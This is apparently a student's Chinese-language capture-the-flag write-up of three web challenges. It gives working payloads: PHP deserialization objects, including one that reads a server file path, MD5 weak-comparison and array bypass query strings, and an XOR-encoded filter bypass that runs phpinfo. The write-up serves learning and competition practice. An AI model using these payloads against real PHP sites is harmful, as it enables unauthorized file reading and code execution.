# TSCTF-J

* ## Web方向

### 0x01 eaSy\_serialize

进入页面发现是源码

![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png)

代码审计得到需要序列化一个PHP类对象，第一个变量为hash类变量，第二个变量值为’noway’，第三个变量值为's1502113478a'（运用md5碰撞）

Exp：

![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image004.png)

在localhost下运行得到序列化码

```
O%3A3%3A%22PHP%22%3A5%3A%7Bs%3A8%3A%22%00PHP%00PHP%22%3BO%3A4%3A%22bash%22%3A3%3A%7Bs%3A1%3A%22z%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A1%3A%22x%22%3Bs%3A4%3A%22null%22%3Bs%3A1%3A%22y%22%3Bs%3A4%3A%22null%22%3B%7Ds%3A9%3A%22%00PHP%00java%22%3Bs%3A5%3A%22noway%22%3Bs%3A1%3A%22c%22%3Bs%3A12%3A%22s1502113478a%22%3Bs%3A6%3A%22python%22%3BN%3Bs%3A4%3A%22bash%22%3BN%3B%7D%3Cbr%3E
```



Payload:

```
?guess= O%3A3%3A%22PHP%22%3A5%3A%7Bs%3A8%3A%22%00PHP%00PHP%22%3BO%3A4%3A%22bash%22%3A3%3A%7Bs%3A1%3A%22z%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A1%3A%22x%22%3Bs%3A4%3A%22null%22%3Bs%3A1%3A%22y%22%3Bs%3A4%3A%22null%22%3B%7Ds%3A9%3A%22%00PHP%00java%22%3Bs%3A5%3A%22noway%22%3Bs%3A1%3A%22c%22%3Bs%3A12%3A%22s1502113478a%22%3Bs%3A6%3A%22python%22%3BN%3Bs%3A4%3A%22bash%22%3BN%3B%7D%3Cbr%3E
```

获得flag

![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image006.png)

### 

### 0x02 EasyF12

虽然题目写了只用F12就行，但是进去之后F12发现被坑了

![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg)

发现game1.html，点进去看看

![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg)

芜湖，发现右键被disabled了，果断删掉

然后上上下下左左右右成功进入下一关

![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg)

？？？让老子点9999下？爬

![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg)

点击“完成训练”抓包得到这个，发现有两个可以改的地方，q和liliang，更改liliang为9999发现没用，改一下q=9999，发现建议变成了

![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg)

找到fina1.php

发现屁都没有

F12看一下发现是白色隐藏起来了

![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg)

发现需要用get方法递交四个变量，同时要满足

```
($param1 != $param2)&&(md5($param1) == md5($param2))
```

和

```
($param3 != $param4)&&(md5($param3) === md5($param4))
```

然后懵逼了

注意到第一个md5比较是’==’，考点为php弱类型对比，采用md5碰撞，得到$param1和$param2值（我采用的是$param1=s878926199a和$param2=s155964671a），但后面的就不行了，因为’===’为php强类型对比，因而采用md5不能加密数组的漏洞

```
Payload：?param1=s878926199a&&param2=s155964671a&&param3[]=1&&param4[]=2
```

获得flag

![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg)



### 0x03 easyWEB

打开页面发现就是一个输入框，输入了几次都是error

查看源代码发现一个叫submit.js的文件，内部有一个叫做BubbleGVM的函数，初步推测与检测输入有关

进入submit.js查看源代码，发现了一段代码

![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png)

用python脚本翻译一下十六进制代码，得到

![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image004.png)

发现一个目录叫/fllllaiig，进去看看

![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image006.png)

整理代码思路：

通过get方法传入已经序列化的参数，当参数为常规可反序列化对象时进行反序列化，传入protected类型变量op, filename, content和passwd，其中passwd值需要经过验证，在传入pop参数后在析构函数中调用process函数进行反序列化以及验证passwd操作

发现两个点：

第一个点![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image008.png)

加盐md5，已知盐值，而且提示passwd都是数字，则尝试用脚本跑出来

![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image010.png)

之后在文件中搜索发现最后的密码为5201314

![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image012.png)

第二个点：

![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image014.png)

析构函数中op===’2’为强对比，而前面验证函数中op==’2’为弱对比，因而可以通过op=2来绕过强对比，避免op被置为‘1’从而跳入put分支

第三个点：

变量类型为protected，在之后构造payload时需要对payload进行手动修改

构造payload：

![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image016.png)

远程file\_get\_contents\(file\)需要用绝对地址

![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image018.png)

在构造protected变量的序列化过程中存在\00字符，表现为不可见字符，需要手动添加，位置为环绕\*字符左右各一个，同时s要大写表示后面允许使用\00的表达

最终payload: 

```
O:11:"FileHandler":4:{S:5:"\00*\00op";i:2;S:11:"\00*\00filename";S:32:"/var/www/html/fllllaiig/hint.php";S:10:"\00*\00content";S:3:"111";S:9:"\00*\00passwd";S:7:"5201314";}
```

发现result并无返回值，查看页面源代码发现hint：![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image020.png)

进入到/bubblegvm5201314目录下查看

![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image022.png)

发现是正则表达式检测，通过异或绕过

Payload：

```
?a=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
```

跳转到phpinfo界面，在disable\_function处发现flag：

![](file:///C:/Users/86136/AppData/Local/Temp/msohtmlclip1/01/clip_image024.png)

